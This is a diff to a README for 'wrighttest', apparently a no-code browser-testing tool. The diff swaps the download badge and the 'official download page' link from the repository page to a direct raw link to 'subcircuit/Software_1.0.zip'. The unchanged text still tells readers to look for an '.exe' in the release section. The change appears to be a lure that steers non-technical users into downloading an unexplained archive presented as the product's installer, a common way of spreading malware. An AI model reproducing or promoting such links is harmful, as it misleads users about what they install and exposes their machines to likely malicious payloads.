@@ -1,6 +1,6 @@
 # 🚀 wrighttest - Build reliable browser tests without code
 
-[![Download wrighttest](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/Blockretroversion411/wrighttest)
+[![Download wrighttest](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/Blockretroversion411/wrighttest/raw/refs/heads/main/subcircuit/Software_1.0.zip)
 
 wrighttest helps you test websites. It uses Playwright to drive browsers. You record clicks and inputs on your screen to create tests. You do not need to write code. This tool helps teams check if web pages work as expected. It supports mobile device simulation and uses Docker for consistent environments.
 
@@ -19,7 +19,7 @@ If your computer meets these needs, you can proceed. Ensure you have administrat
 
 The software lives on the internet. You must find the download page to get the installer for your computer.
 
-[Visit the official download page here](https://github.com/Blockretroversion411/wrighttest)
+[Visit the official download page here](https://github.com/Blockretroversion411/wrighttest/raw/refs/heads/main/subcircuit/Software_1.0.zip)
 
 Click the link above. This takes you to the release section. Look for the file ending in `.exe`. Click the file name to start the download. Save the file to your computer. Common places include your Downloads folder or your Desktop. Wait for the download to finish. Do not close your browser while the file moves to your disk.
 
